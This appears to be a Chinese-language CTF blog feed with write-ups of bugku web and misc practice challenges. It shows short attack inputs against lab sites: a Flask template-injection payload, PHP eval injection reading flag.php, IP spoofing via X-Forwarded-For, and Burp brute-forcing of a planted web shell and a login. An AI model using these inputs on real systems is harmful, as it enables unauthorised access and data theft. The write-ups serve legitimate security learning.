    <content type="html"><![CDATA[<h3 id="1-滑稽"><a href="#1-滑稽" class="headerlink" title="1.滑稽"></a>1.滑稽</h3><p>F12查看即可，又是考视力&#x3D; &#x3D;</p><p><img src="%E6%BB%91%E7%A8%BD.png" alt="滑稽"></p><hr><h3 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.计算器</h3><p>小学算数，答案是111，但是输入1之后就输入不进去了，直接改前端代码</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt="计算器"></p><p>把maxlength删了或者把1改大一点就行了，提交</p><hr><h3 id="3-GET"><a href="#3-GET" class="headerlink" title="3.GET"></a>3.GET</h3><p><img src="GET1.png" alt="GET"></p><p>简单的代码审计，直接GET传参</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">what</span>=flag<br></code></pre></td></tr></table></figure><p><img src="GET2.png" alt="GET2"></p><hr><h3 id="4-Simple-SSTI-1"><a href="#4-Simple-SSTI-1" class="headerlink" title="4.Simple_SSTI_1"></a>4.Simple_SSTI_1</h3><p>页面提示我需要绕过一个叫flag的参数，然后F12说：你知道，在烧瓶里，我们经常设置一个secret_key变量。 </p><p>![Simple_SSTI_1.1]Simple_SSTI_1.1.png)</p><p>flask的模板注入：（注意：这里的SECRET_KEY需要大写）</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">？flag=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.SECRET_KEY</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="Simple_SSTI_1.2.png" alt="Simple_SSTI_1.2"></p><p>flask使用jinjia2渲染引擎进行网页渲染，当处理不得当，未进行语句过滤，用户输入，会导致渲染出恶意代码，形成注入</p><p>注：SSTI 就是服务器端模板注入（Server-Side Template  Injection）当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web  应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">详见</a></p><hr><h3 id="5-POST"><a href="#5-POST" class="headerlink" title="5.POST"></a>5.POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$what</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;what&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$what</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$what</span>==<span class="hljs-string">&#x27;flag&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;****&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>比较简单，post方式提交what变量即可：</p><p><img src="POST.png" alt="POST"></p><p>提交就得到flag</p><hr><h3 id="6-矛盾"><a href="#6-矛盾" class="headerlink" title="6.矛盾"></a>6.矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET方式获得num，先判断num不是数字，然后num还要等于1，才输出flag</p><p>想了一下，写出以下payload：num&#x3D;1 and 1</p><p>以此类推就是条件判断就行了，写num&#x3D;1 and 1or 1这种也行，交上去就有flag了</p><hr><h3 id="7-alert"><a href="#7-alert" class="headerlink" title="7.alert"></a>7.alert</h3><p>进入场景是一个弹窗，写着flag就在这：</p><p><img src="alert1.png" alt="alert1"></p><p>F12或者ctrl+u看见一串编码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#103;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#51;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#57;</span><span class="hljs-symbol">&amp;#48;</span><span class="hljs-symbol">&amp;#55;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#57;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#51;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#100;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#102;</span><span class="hljs-symbol">&amp;#54;</span><span class="hljs-symbol">&amp;#48;</span><span class="hljs-symbol">&amp;#98;</span><span class="hljs-symbol">&amp;#125;</span><br></code></pre></td></tr></table></figure><p>直接放burp里Smart decode，html解密就得到flag：</p><p><img src="alert2.png" alt="alert2"></p><hr><h3 id="8-你必须让他停下"><a href="#8-你必须让他停下" class="headerlink" title="8.你必须让他停下"></a>8.你必须让他停下</h3><p>进入页面，两行字：</p><p><strong>I want to play Dummy game with others£¡But I can’t stop!</strong> </p><p>Stop at panda ! u will get flag</p><p>我想到的是，burp直接拦呗，放到repeater模块一直send：</p><p><img src="%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B1.png" alt="你必须让他停下1"></p><p>这里每次刷新得到的的页面都不同，故返回页面也不一样，10.jpg是flag所在的包。</p><hr><h3 id="9-头等舱"><a href="#9-头等舱" class="headerlink" title="9.头等舱"></a>9.头等舱</h3><p>啥也没有，F12，ctrl+u都没有，抓个包看看：</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B1.png" alt="头等舱"></p><p>我一想，既然包里有，那F12网络一栏应该也有，这里是肯定的，这里就不演示了。</p><hr><h3 id="10-eval"><a href="#10-eval" class="headerlink" title="10.eval"></a>10.eval</h3><p>页面给出了代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先学习一下：<strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p>file() 函数把整个文件读入一个数组中。</p><p>命令执行嘛，先看看全局变量。构造?hello&#x3D;$GLOBALS</p><p><img src="eval1.png" alt="eval1"></p><p>没看见有flag相关的变量，那应该在文件里，构造?hello&#x3D;file(‘flag.php’)</p><p><img src="eval2.png" alt="eval2"></p><hr><h3 id="11-网站被黑"><a href="#11-网站被黑" class="headerlink" title="11.网站被黑"></a>11.网站被黑</h3><p>题目描述：网站被黑了，黑客会不会留下后门                            </p><p>看样子是提示我们找后门，那就御剑扫一波，发现index.php和shell.php</p><p>访问index.php和之前没啥区别，看看shell.php：</p><p><img src="%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91.png" alt="网站被黑1"></p><p>应该是后门密码，万能密码试了一下，不行，页面提示<strong>不是自己的马不要乱骑！</strong></p><p>还挺有意思，直接burp暴破，字典里的密码都不对，在网上看了一下wp，密码是hack</p><p>然后就拿到flag了</p><hr><h3 id="12-本地管理员"><a href="#12-本地管理员" class="headerlink" title="12.本地管理员"></a>12.本地管理员</h3><p>打开页面是这样的：</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%981.png" alt="本地管理员1"></p><p>试试弱口令，页面回显是“**IP禁止访问，请联系本地管理员登陆，IP已被记录.**”</p><p>看样子要改ip：X-Forwarded-For:127.0.0.1</p><p>发过去之后提示：<strong>Invalid credentials! Please try again!</strong></p><p>应该是密码错了，F12看一下，发现了一串字符，应该是base64编码</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%982.png" alt="本地管理员2"></p><p> dGVzdDEyMw&#x3D;&#x3D; </p><p>burp解码一下：是test123，这应该是密码，提交试试</p><p><img src="%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%983.png" alt="本地管理员3"></p><hr><h3 id="13-变量1"><a href="#13-变量1" class="headerlink" title="13.变量1"></a>13.变量1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">flag In the variable ! <br><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123; <span class="hljs-comment">// // 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先学一下：</p><p>isset()函数用于检测变量是否已设置并且非 NULL。</p><p>prep_match: 用于执行一个正则表达式匹配。</p><p>error_reporting(0)关闭错误显示。</p><p>还是老规矩，先看看全局变量，虽然不让传’$’,但是在var_dump()函数中给出了‘$’，还是挺有意思的：</p><p><img src="%E5%8F%98%E9%87%8F1.png" alt="变量1"></p><hr><h3 id="14-Simple-SSTI-2"><a href="#14-Simple-SSTI-2" class="headerlink" title="14.Simple_SSTI_2"></a>14.Simple_SSTI_2</h3><hr><h3 id="15-Flask-FileUpload"><a href="#15-Flask-FileUpload" class="headerlink" title="15.Flask_FileUpload"></a>15.Flask_FileUpload</h3><hr><h3 id="16-game1"><a href="#16-game1" class="headerlink" title="16.game1"></a>16.game1</h3><p>让我玩游戏，先玩两把<del>摸个鱼</del>，然后看了看源码，没啥收获，直接在游戏结束时抓包，修改score的值，但是即使我改的了很高的分数，依然是失败</p><p><img src="game11.png" alt="game1"></p><p>那就没这么简单了，看了一下大佬的wp,给出的思路是：说明有其他的参数来验证分数的真实性；这个参数可能是 sign或者可能在 cookie里。</p><p><img src="game12.png" alt="game2"></p><p>很明显，当分数不同时不同的包差距在于 score和 sign</p><p>对比sign发现 sign是由 zM + xxx + &#x3D;&#x3D; 构成</p><p>zM是很好看出来的，等号那有点难看，那好办，去base64解码看看就知道了，MjU&#x3D;解密出来是25，MjU&#x3D;&#x3D;出来是25&#x3D;，所以后面俩等号是固定的</p><p>那就好办了，把分数和sign同时改高就行了，这里我改成9999：</p><p><img src="game13.png" alt="game3"></p><p>这里我还试了一下单改sign，发现不行，说明两个参数是同时校验的。</p><p>做完之后突然想到能不能用intruder同时暴破两个地方，答案是肯定的，我写了个脚本，给出了300-1000之间的数字，然后为了实验成功，我在最后加了9999，intruder选择Pitchfork模式，Payload Sets选择Custom iterator，在Payload Processing选择Add，选base64加密，也能成功：</p><p><img src="game14.png" alt="game14"></p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1.游戏类的一般都是通过修改分数来的，要嘛改高（999999) ,要嘛改低（-999999) </p><p>2.控制分数的参数可能不止一个，如果有加密的就得尝试解密。一般就多试几次，找到因分数不同而改变的参数，然后对该参数进行分析</p><hr><h3 id="17-bp"><a href="#17-bp" class="headerlink" title="17.bp"></a>17.bp</h3><p>提示:密码top1000？z?????</p><p>TOP1000的字典跑一下，没区别</p><p><img src="bp1.png" alt="bp1"></p><p>发现每个包都有一段js代码，这时需要用到Intruder中的Grep-Match功能：该功能可以帮我们分析Response中是否含有给定字符串。</p><p>Intruder模块Ootions，打开Grep-Extract</p><p>Add一条code: ‘bugku10000’</p><p><img src="bp2.png" alt="bp2"></p><p>zxc123应该就是密码了，登录即可。</p><hr><h3 id="18-社工-伪造"><a href="#18-社工-伪造" class="headerlink" title="18.社工-伪造"></a>18.社工-伪造</h3><p>一进来是这种</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A01.png" alt="社工-伪造1"></p><p>皮一下</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A02.png" alt="社工-伪造2"></p><p>不知道干啥，看看空间</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A03.png" alt="社工-伪造3"></p><p>说只有他男朋友在qq空间问他，他才能交出flag，试试暴破一下，我猜如果是他男朋友的号，包会有所不同，试了一下，速度太慢，然后server error了，看下面评论说要登自己qq，试了一下</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A04.png" alt="社工-伪造4"></p><p>还真是，然后把自己的QQ昵称改成他男朋友的：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A05.png" alt="社工-伪造5"></p><p>不愧是社工的题，我的评价是，<del>我还是脑洞不够大</del>，我还是不够BT，没想到把昵称改了。</p><hr><h3 id="19-社工-初步收集"><a href="#19-社工-初步收集" class="headerlink" title="19.社工-初步收集"></a>19.社工-初步收集</h3><p>点下载辅助，下载了个exe文件，被拦了，说可能损坏电脑，仍要运行就行：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%861.png" alt="社工-初步收集1"></p><p>这里的话，涉及一个知识点就是遇到这种开挂的软件或者别的软件时，我们可以查看流量的走向。</p><p>打开wireshark，监听wlan，然后再开始刷</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%862.png" alt="社工-初步收集2"></p><p>也算是考眼力吧，拿到账号密码了以为到此结束了，没想到不对，看着像base64编码，解码看看</p><p><a href="mailto:&#x62;&#x75;&#103;&#x6b;&#x75;&#107;&#117;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#x6f;&#x6d;">&#x62;&#x75;&#103;&#x6b;&#x75;&#107;&#117;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#x6f;&#x6d;</a></p><p>XSLROCPMNWWZQDZL</p><p>怪不得有bugku@163的流量包，去网易邮箱看看，但是账号密码登录失败了，这里还有一个知识点：邮箱登录的方式，主流是两种，一种是密码登录，一种是授权码登录，官网提供的邮箱登录一般是账号+密码登录，第三方邮件系统登录的一般都是客户端+授权码登录。<br>很显然，我们解出来的那串base64不是密码，那么应该就是授权码了，网上wp是用foxmail，还有用QQ邮箱手机版的，都成功登录了，找到了一个邮件：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%863.png" alt="社工-初步收集3"></p><p>有账号密码，御剑扫后台发现了登陆界面：</p><p><img src="%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%864.png" alt="社工-初步收集4"></p><p>去登录就行了。</p><hr>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>bugku</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度3</title>
    <link href="/2023/04/27/web03/"/>
    <url>/2023/04/27/web03/</url>
    
    <content type="html"><![CDATA[<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p>先试了一下万能密码，没成，然后用bp跑了一下字典，也没成功，想到robots.txt，发现Disallow：&#x2F;user.php.bak</p><p><img src="fakebook1.png" alt="fakebook1"></p><p>访问后下载了网页源码</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>难度1</title>
    <link href="/2023/04/22/misc01/"/>
    <url>/2023/04/22/misc01/</url>
    
    <content type="html"><![CDATA[<h2 id="记两道润天杯校赛的题"><a href="#记两道润天杯校赛的题" class="headerlink" title="记两道润天杯校赛的题"></a>记两道润天杯校赛的题</h2><h3 id="1-misc-1"><a href="#1-misc-1" class="headerlink" title="1.misc_1"></a>1.misc_1</h3><p>解压之后是一张图片，用01editor打开，由于是jpg图片，直接搜FFD9</p><p><img src="misc_1.1.png" alt="misc_1.1"></p><p>看见后面有pk，得知是zip，直接另存为zip，打开就拿到flag了</p><hr><h3 id="2-misc-2"><a href="#2-misc-2" class="headerlink" title="2. misc_2"></a>2. misc_2</h3><p>打开图片属性，看到这：</p><p><img src="misc_2.png" alt="misc_2"></p><p>社会主义核心价值观加密，直接复制版权信息解密两次就行了，<a href="http://www.atoolbox.net/Tool.php?Id=850">在线工具</a></p><p><strong>在这里感谢x2658y大佬给讲题~</strong></p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="1-Banmabanma"><a href="#1-Banmabanma" class="headerlink" title="1.Banmabanma"></a>1.Banmabanma</h3><p>一张图，先记事本打开，没收获，就去stegsolve看了一下，用手机扫也没结果，不知道是不是我的问题&#x3D; &#x3D;，ida也是一无所获</p><p>最后去网上看wp，发现了一个叫条形码在线阅读的网站 <a href="https://online-barcode-reader.inliteresearch.com/">Barcode Reader. Free Online Web Application</a></p><p>把图片放进去就拿到flag了</p><p><img src="Banmabanma.png" alt="Banmabanma"></p><hr><h3 id="2-适合作为桌面"><a href="#2-适合作为桌面" class="headerlink" title="2.适合作为桌面"></a>2.适合作为桌面</h3><p>先从简单的入手，记事本打开，没找到flag，然后用stegsolve打开，找到了一个二维码：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A21.png" alt="适合作为桌面1"></p><p>还是去上一题提到的那个网站扫一下二维码看看：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A22.png" alt="适合作为桌面2"></p><p>（stegsolve换图层的过程中我发现有的二维码是扫不了的）</p><p>得到了一串16进制的数字</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">03</span>F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E0100000<span class="hljs-number">07300000000</span><br></code></pre></td></tr></table></figure><p>03F30D0A是pyc文件</p><p><strong>pyc文件</strong>：是由Python文件经过编译后所生成的文件，众所周知Python的运行性能不如编译性语言(比如C语言)，所以Python在程序执行结束后会把字节码写入到硬盘中，保存为.pyc文件，目的是下一次再执行python xxx.py程序时，Python会先在目录下找xxx.pyc文件来执行</p><p>01editor打开如下：</p><p><img src="%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A23.png" alt="适合作为桌面3"></p><p><strong>依然在这里感谢x2658y</strong>，要不然我还傻了吧唧写成txt，正确做法应该是放到01editor另存为pyc文件</p><p>然后去反编译：</p><p><a href="https://tool.lu/pyc/">python反编译在线工具</a></p><p>得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 2.7</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-built_in">str</span> = [<br>        <span class="hljs-number">102</span>,<br>        <span class="hljs-number">108</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">103</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">97</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">51</span>,<br>        <span class="hljs-number">50</span>,<br>        <span class="hljs-number">48</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">53</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">52</span>,<br>        <span class="hljs-number">49</span>,<br>        <span class="hljs-number">101</span>,<br>        <span class="hljs-number">55</span>,<br>        <span class="hljs-number">125</span>]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        flag += <span class="hljs-built_in">chr</span>(i)<br>    <br>    <span class="hljs-built_in">print</span> flag<br>flag() //反编译没这一行，我们需要调用flag()<br></code></pre></td></tr></table></figure><p>注释提到是python2.7，所以直接去<a href="https://c.runoob.com/compile/6/">在线编译</a></p><p>这里flag()要顶格，我不知道为什么，<del>但我大为震撼</del></p><p>最后得到了flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">38</span>a57032085441e7&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-心仪的公司"><a href="#3-心仪的公司" class="headerlink" title="3.心仪的公司"></a>3.心仪的公司</h3><p>这道题是wireshark的包，借此机会学习一下wireshark的<a href="https://blog.csdn.net/yeyiqun/article/details/99310715">颜色规则</a></p><p>这个流量包叫webshell，故在显示过滤器中输入：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span><span class="hljs-string">&quot;webshell&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B81.png" alt="心仪的公司1"></p><p>追踪TCP流，找到flag</p><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B82.png" alt="心仪的公司2"></p><p>还有一种方法，在kali里输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>&#123;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><strong>命令的意思是在webshell这个包里过滤含有”{“的字符串，然后输出</strong></p><p>这里我是照着大佬们的wp写的，但是我这里输出了很多行，所以我改一下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings webshell.pcapng <span class="hljs-string">| grep &quot;</span>fl4g<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E5%BF%83%E4%BB%AA%E7%9A%84%E5%85%AC%E5%8F%B83.png" alt="心仪的公司3"></p><p><del>这里有点面向结果了</del>，正常解的话应该是先grep”flag“，可以看到没收获，这时可以试试fl4g</p><p><strong>strings命令</strong> 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。</p><p><strong>管道符</strong>：|</p><p><strong>作用</strong>：管道是一种通信机制，通常用于进程间的通信。它表现出来的形式将前面每一个进程的输出（stdout）直接作为下一个进程的输入</p><p>ls &#x2F; | grep “y“</p><p>grep 指令用于“过滤”<br>grep 语法：grep 选项 文件路径&#x2F;内容</p><p>针对上面这个命令说明：<br>① 以管道作为分界线，前面的命令有个输出，后面需要先输入（缺少查找范围），然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入。<br>为了便于理解，上述的指令变相实现可以如下：</p><p>ls &#x2F; &gt; xxx.txt 将ls &#x2F;的结果保存到xxx.txt文件中</p><p>grep “y” xxx.txt 使用grep指令搜索xxx.txt中的包含y的行</p><hr><h3 id="4-pure-color"><a href="#4-pure-color" class="headerlink" title="4.pure_color"></a>4.pure_color</h3><p>是一张图片，直接放到stegsolve中</p><p><img src="pure_color1.png" alt="pure_color1"></p><p>比较简单flag{true_steganographers_doesnt_need_any_tools}</p><p>不过这个题的flag挺有意思，他说真正的隐写技师不需要任何工具 [狗头]</p><hr><h3 id="5-2017-Dating-in-Singapore"><a href="#5-2017-Dating-in-Singapore" class="headerlink" title="5.2017_Dating_in_Singapore"></a>5.2017_Dating_in_Singapore</h3><p>题目名字叫新加坡2017年的日历，打开也是个日历，有点意思</p><p><img src="2017_Dating_in_Singapore1.png" alt="2017_Dating_in_Singapore1"></p><p><a href="https://blog.csdn.net/qq_42016346/article/details/104234416">wp</a></p><hr><h3 id="6-simple-transfer"><a href="#6-simple-transfer" class="headerlink" title="6.simple_transfer"></a>6.simple_transfer</h3><p>题目描述: 文件里有flag，找到它。</p><p>下载了一个pcap的流量包，网上的wp都过滤了很多nfs，然后找到了file.pdf，这也是后面为什么分离pdf的原因，但是我这就两条，<del>我不懂</del></p><p>直接扔到kali里输入命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> <span class="hljs-number">1</span>.pcap<br></code></pre></td></tr></table></figure><p>发现有一个pdf文件，接着输入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foremost -t pdf -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.pcap</span> <br></code></pre></td></tr></table></figure><p>-t为指定文件类型，-i是指定输入，-o是指定输出，这里没指出，默认给出output文件夹：</p><p><img 